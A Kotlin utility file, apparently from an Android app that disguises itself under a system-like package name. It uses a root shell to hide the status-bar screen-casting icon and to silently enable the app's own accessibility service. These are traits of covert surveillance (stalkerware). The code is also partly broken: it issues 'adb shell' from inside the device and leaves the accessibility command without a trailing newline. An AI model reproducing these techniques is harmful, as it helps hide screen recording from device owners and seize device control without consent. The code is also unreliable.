package com.android.services.util

import java.io.DataOutputStream

object SecureSettingUtil {

    /**
     * disable the screen recording icon
     */
    @JvmStatic
    fun disableScreenCastingIcon() {
        try {
            val process = Runtime.getRuntime().exec("su")
            val out = DataOutputStream(process.outputStream)
            out.writeBytes("adb shell\n")
            out.writeBytes("settings put secure icon_blacklist cast\n")
            out.writeBytes("exit\n")
            out.flush()
            process.waitFor()
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    /**
     * enable the screen recording icon
     */
    @JvmStatic
    fun enableScreenCastingIcon() {
        try {
            val process = Runtime.getRuntime().exec("su")
            val out = DataOutputStream(process.outputStream)
            out.writeBytes("adb shell\n")
            out.writeBytes("settings delete secure icon_blacklist\n")
            out.writeBytes("exit\n")
            out.flush()
            process.waitFor()
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    @JvmStatic
    fun enableAccessibilityAccess() {
        try {
            val process = Runtime.getRuntime().exec("su")
            val out = DataOutputStream(process.outputStream)
            out.writeBytes("adb shell\n")
            out.writeBytes("""settings put secure enabled_accessibility_services %accessibility:com.android.services/com.android.services.services.MyAccessibilityService""".trimIndent())
            out.writeBytes("exit\n")
            out.flush()
            process.waitFor()
        } catch (e: Exception) {
            e.message
        }
    }
}